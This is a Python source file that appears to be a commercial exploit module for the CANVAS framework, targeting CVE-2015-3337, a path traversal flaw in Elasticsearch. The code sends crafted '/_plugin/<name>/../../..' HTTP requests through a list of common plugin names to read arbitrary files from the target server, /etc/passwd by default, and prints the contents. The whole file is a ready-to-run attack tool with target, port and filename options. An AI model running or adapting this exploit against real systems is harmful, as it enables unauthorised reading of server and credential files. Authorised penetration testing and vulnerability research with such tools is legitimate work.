#! /usr/bin/env python
# -*- coding: utf-8 -*-

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2015
#


import sys, time, os, thread

sys.path.append(".")
sys.path.append("../../")

import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from libs.spkproxy import header, body
from libs.canvasos import *
import canvasengine
import StringIO
import urllib, urllib2

# GUI info
NAME = "d2sec_elasticsearch2"
DESCRIPTION = "Elasticsearch Path Traversal Vulnerability" 
VERSION="1.0"

DOCUMENTATION = {}
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION['References'] = "2015/05/18"
DOCUMENTATION['Date public'] = ""
DOCUMENTATION['Versions Affected'] = "< 1.4.5 and < 1.5.2"
DOCUMENTATION["CVE Name"] = "CVE-2015-3337"
DOCUMENTATION["Notes"] = ""

PROPERTY={}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]

class theexploit (tcpexploit):

  def __init__(self):
    tcpexploit.__init__(self)
    self.name = NAME
    self.vhost = ''
    self.port = 9200 
    self.filename = '/etc/passwd'

  def display_content_file(self):
    pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head']
    for plugin in pluginList:
      request  = "GET /_plugin/%s/../../../../../..%s HTTP/1.0\r\n"%(plugin, self.filename)
      request += "Host: %s:%d\r\n"%(self.host, self.port)
      request += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n"
      request += "\r\n"
      try:
        s = self.gettcpsock()
        s.connect((self.host, self.port))
        self.websend(s, request)
        data = self.webrecv(s, 8192)
      except Exception, e:
        self.log('[D2] %s'%e)
        return 0
      self.log('[D2] ElasticSearch Path Traversal with plugin %s' % plugin)
      self.log('%s' % data)
      break
    return 1

  def getargs(self):
    self.host = self.target.interface
    self.port = int(self.argsDict.get("port", self.port))
    self.vhost = self.argsDict.get("vhost", self.vhost)
    self.filename = self.argsDict.get("filename", self.filename)
    if not self.vhost:
      self.vhost = self.host
    return 0

  def run(self):
    self.getargs()
    self.setInfo("%s attacking %s:%d" % (NAME, self.host, self.port))
    self.log("%s attacking %s:%d" % (NAME, self.host, self.port))
    if not self.display_content_file():
      self.setInfo("%s attacking %s:%d - failed" % (NAME, self.host, self.port))
      return 0
    self.setInfo("%s attacking %s:%d - done" % (NAME, self.host, self.port))
    self.log("%s attacking %s:%d - done" % (NAME, self.host, self.port))
    return 1

  def usage(self):
    print "Usage: %s -t target [-p port:80] -O vhost:<url> -O filename:<pathname>" % sys.argv[0]
    sys.exit(0)

if __name__ == '__main__':
  print "Running CANVAS %s v %s" % (NAME,VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)

